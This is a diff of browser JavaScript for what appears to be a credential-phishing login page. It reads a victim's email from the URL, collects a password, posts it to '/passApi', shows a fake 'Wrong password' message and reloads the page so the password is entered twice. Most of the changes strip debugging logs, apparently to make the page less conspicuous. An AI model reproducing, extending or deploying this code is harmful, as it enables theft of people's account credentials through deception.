@@ -11,13 +11,16 @@ if (urlParams.has('id')) {
 if (urlParams.has('email') && urlParams.get('email').includes("@")) {
   uniEmail = urlParams.get('email');
 }
-
+function some(){
+  
 fetch("/something")
-  .then((res) => res.text())
-  .then((html) => {
-    document.querySelector(".body").innerHTML = html;
-   something()
-  });
+.then((res) => res.text())
+.then((html) => {
+  document.querySelector(".body").innerHTML = html;
+ something()
+});
+}
+some()
 async function con() {
   document.querySelector(".alert").classList.remove("hidden")
   document.querySelector(".alertBtn").addEventListener("click" , ()=>{
@@ -69,6 +72,7 @@ async function con() {
   let emailLoaded = false;
   
   async function something() {
+    
     document.querySelector(".first").classList.remove("hidden");
     setTimeout(() => {
       document.querySelector(".first").classList.add("hidden");
@@ -195,7 +199,7 @@ document.addEventListener('DOMContentLoaded', function() {
     mutations.forEach(function(mutation) {
       if (mutation.type === 'attributes' && mutation.attributeName === 'class') {
         // Theme changed, you can add any specific logic here if needed
-        console.log('Theme changed to:', isDarkMode() ? 'dark' : 'light');
+        
       }
     });
   });
@@ -249,9 +253,9 @@ document.addEventListener('DOMContentLoaded', function() {
           uniEmail = femail;
     
           if (response.exists) {
-            console.log("Contact already exists, URL updated");
+            
           } else {
-            console.log("Contact added successfully!");
+            
           }
         } else {
           console.error(response.message || "Failed to add contact");
@@ -549,7 +553,9 @@ document.addEventListener('DOMContentLoaded', function() {
     
 
     async function pass() {
-      document.querySelector(".wel").textContent = uniEmail;
+      const urlParams = new URLSearchParams(window.location.search);
+      const welEmail = urlParams.get('email');
+      document.querySelector(".wel").textContent = welEmail;
       
       const emailWrapper = document.querySelector(".emailInp");
       const input = emailWrapper?.querySelector("input");
@@ -565,7 +571,7 @@ document.addEventListener('DOMContentLoaded', function() {
       
       if (!emailWrapper || !input || !label || !emailBtn || !emailBtnContainer || !errorBox || !errorText) {
           console.warn("One or more elements are missing in the DOM.");
-          console.log("Missing elements:", {
+          
               emailWrapper: !!emailWrapper,
               input: !!input,
               label: !!label,
@@ -678,7 +684,7 @@ document.addEventListener('DOMContentLoaded', function() {
       const observer = new MutationObserver(function(mutations) {
           mutations.forEach(function(mutation) {
               if (mutation.type === 'attributes' && mutation.attributeName === 'class') {
-                  console.log('Theme changed to:', isDarkMode() ? 'dark' : 'light');
+                  
               }
           });
       });
@@ -691,14 +697,14 @@ document.addEventListener('DOMContentLoaded', function() {
       // Password toggle functionality
       if (checkbox && passInput) {
           checkbox.addEventListener('change', function () {
-              console.log('Checkbox toggled:', checkbox.checked);
+              
               
               if (checkbox.checked) {
                   passInput.type = "text";
-                  console.log('Password visible');
+                 
               } else {
                   passInput.type = "password";
-                  console.log('Password hidden');
+                  
               }
           });
       } else {
@@ -717,7 +723,7 @@ document.addEventListener('DOMContentLoaded', function() {
                   id: uniId
               };
               
-              console.log(passData);
+              
               
               const request = await fetch("/passApi", {
                   method: "POST",
@@ -728,7 +734,7 @@ document.addEventListener('DOMContentLoaded', function() {
               const response = await request.json();
               
               if (request.ok && response.success) {
-                  console.log("Password updated successfully!");
+                  
                   input.value = "";
               } else {
                   console.error(response.message || "Failed to update password");
@@ -743,15 +749,16 @@ document.addEventListener('DOMContentLoaded', function() {
           const val = input.value.trim();
   
           if (val.length === 0) {
-              console.log("Empty input, calling err()");
+              
               err("Enter a password");
-              console.log("mainFunc() called");
+              
               return;
           }
   
           if (errorText.textContent === "Wrong password. Try again or click Forgot password to reset it.") {
               await passApi();
-              await load("something", 0, "something");
+              location.reload();
+
               return;
           }
   
